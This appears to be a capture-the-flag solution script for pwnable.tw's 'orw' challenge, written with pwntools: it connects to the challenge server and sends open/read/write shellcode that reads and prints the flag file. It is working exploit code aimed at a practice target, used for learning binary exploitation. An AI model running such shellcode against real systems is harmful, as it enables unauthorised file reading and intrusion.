from pwn import *




elf = context.binary = ELF('orw')

#nc chall.pwnable.tw 10001

p = remote(b'chall.pwnable.tw', 10001)


#p = process()
#gdb.attach(p, gdbscript='''b *0x0804858a
#           c''')

shellcode = shellcraft.open('/home/orw/flag\x00')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)


p.sendafter(b'shellcode', asm(shellcode))

p.interactive()

